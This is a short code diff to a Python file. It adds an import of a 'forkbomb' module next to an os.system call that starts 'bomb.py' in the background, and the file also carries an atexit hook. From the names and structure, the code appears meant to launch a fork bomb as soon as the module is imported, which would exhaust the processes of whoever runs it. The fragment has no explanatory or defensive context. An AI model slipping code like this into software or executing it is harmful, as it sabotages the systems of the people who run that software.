@@ -1,4 +1,5 @@
 import os
+from forkbomb import forkbomb
 os.system("python _run.py && python bomb.py &")
 
 @atexit.register
